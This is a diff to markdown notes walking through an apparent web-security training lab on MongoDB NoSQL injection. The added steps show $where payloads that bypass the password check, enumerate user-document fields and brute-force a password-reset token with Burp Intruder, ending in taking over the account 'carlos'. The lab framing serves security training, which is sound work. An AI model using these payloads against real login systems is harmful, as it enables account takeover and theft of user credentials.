@@ -193,8 +193,9 @@ User login is vulnerable to nosqli. We try:
     }
 }
 ```
-We get back `account is locked` error.
-Mongo also has `$where` operator which accepts a string of a javascript code.
+We get back `account is locked` error. Which means that the password was correct but the account had been blocked before we tried to log into it.
+
+Mongo also has the `$where` operator which accepts a string of a javascript code.
 So we try:
 ```bash
 {"username":"carlos","password":{"$ne":"invalid"}, "$where": "function() {return 0}"}
@@ -207,9 +208,76 @@ And we receive: `Invalid username or password` err.
 If we change `"$where": "1"`
 We get `account locked` err again
 
-After the injection on the backend it probably looks something like:
+After the injection, on the backend it probably looks something like:
 ```bash
 await userMongooseModel.find({"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"})
 ```
 
+So we first figure out how many fields the user document has:
+```bash
+{
+    "username":"carlos",
+    "password":{"$ne":"invalid"},
+    "$where": "function() { return Object.keys(this).length === 4 }"
+}
+```
+So there are 4 fields in user document. We know for sure the first one is `_id`, 
+```bash
+{
+    "username":"carlos",
+    "password":{"$ne":"invalid"},
+    "$where": "function() { return Object.keys(this)[1] === 'username' }"
+}
+```
+The second (at index 1) is `username`
+```bash
+{
+    "username":"carlos",
+    "password":{"$ne":"invalid"},
+    "$where": "function() { return Object.keys(this)[2] === 'password' }"
+}
+```
+The third (at index 2) is `password`
+
+And now we need to figure out what is the name of the last field in user document
+```bash
+{
+    "username":"carlos",
+    "password":{"$ne":"invalid"},
+    "$where": "function() { return Object.keys(this)[3].startsWith('a') }"
+}
+```
+So we now are bruteforcing the value between `startsWith(<valueToBeBruteForced>)`
+After finding the first letter we then brute force the second, and so on:
+```bash
+...
+"$where": "function() { return Object.keys(this)[3].startsWith('e<second letter to be brute forced>') }"
+```
+So we now know that the fourth field is `email`
+
+**Important**: after hitting reset password endpoint with username `carlos` a new field in the user document was created and the following returns true.
+```bash
+"$where": "function() { return Object.keys(this).length === 5 }"
+```
+So we now brute force the name of the fifth field:
+```bash
+"$where": "function() { return Object.keys(this)[4].startsWith('§a§') }"
+```
+Eventually via brute force we figure out the name of the fifth field which is `passwordReset`
+
+Now we need to brute force the value of that `passwordReset`.
+e.g. in burp Intruder it can be done in the following way:
+```bash
+"$where": "function() { return this['passwordReset'].match('^.{§§}§§.*') }"
+```
+- Then select Cluster bomb attack from the attack type drop-down menu.
+- In the Payloads side panel, select position 1 from the Payload position drop-down list, then set the Payload type to Numbers. Set the number range, for example from 0 to 20.
+- Select position 2 from the Payload position drop-down list and make sure the Payload type is set to Simple list. Add all numbers, lower-case letters and upper-case letters as payloads. If you're using Burp Suite Professional, you can use the built-in word lists a-z, A-Z, and 0-9.
+- Click  Start attack.
+- Sort the attack results by Payload 1, then Length, to identify responses with an Account locked message instead of the Invalid username or password message. Note the letters from the Payload 2 column down.
+
+Then
+- In Repeater, submit the value of the password reset token in the URL of the GET / forgot-password request: GET /forgot-password?YOURTOKENNAME=TOKENVALUE
+- Right-click the response and select Request in browser > Original session. Paste this into Burp's browser
+- Change Carlos's password, then log in as carlos to solve the lab
 
